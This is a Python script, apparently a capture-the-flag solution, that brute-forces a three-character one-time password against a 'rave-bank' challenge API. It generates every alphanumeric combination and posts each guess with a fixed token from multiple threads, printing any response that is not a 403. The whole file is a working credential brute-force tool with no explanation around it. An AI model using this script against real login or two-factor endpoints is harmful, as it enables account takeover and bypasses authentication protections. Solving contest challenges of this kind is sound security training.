import requests
import threading
import queue
import sys
import json

url = 'http://rave-bank.level-up.2020.tasks.cyberchallenge.ru/api/auth/otp'
otp = 'E9AWekJPPNzKe-hlnMb18'

alph = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

pwd_queue = queue.Queue()
bruted = False
right_otp = ""


def fill_queue():
    for x1 in alph:
        for x2 in alph:
            for x3 in alph:
                pwd_queue.put(x1 + x2 + x3, timeout=1)


class Brute_Worker(threading.Thread):
    def __init__(self, queue, tid):
        threading.Thread.__init__(self)
        self.pwd_queue = queue
        self.tid = tid
        print("Initialized thread" + str(self))

    def run(self):
        while not self.pwd_queue.empty():
            if not bruted:
                pwd = self.pwd_queue.get_nowait()
                response = requests.post(url, data={"otpToken": otp, "otp": pwd})
                if json.loads(response.text)['statusCode'] != 403:
                    print(f'Thread {str(self.tid)} + : {str(pwd)} -> {response.text}')

                self.pwd_queue.task_done()


def main():
    threads_count = 1
    if len(sys.argv) > 1:
        threads_count = int(sys.argv[1])

    fill_queue()
    threads = []

    print('Dictionary filled. Size: ' + str(pwd_queue.qsize()))
    for i in range(threads_count):
        worker = Brute_Worker(pwd_queue, i)
        worker.setDaemon(True)
        worker.start()
        threads.append(worker)

    for th in threads:
        th.join()

    pwd_queue.join()


if __name__ == '__main__':
    main()
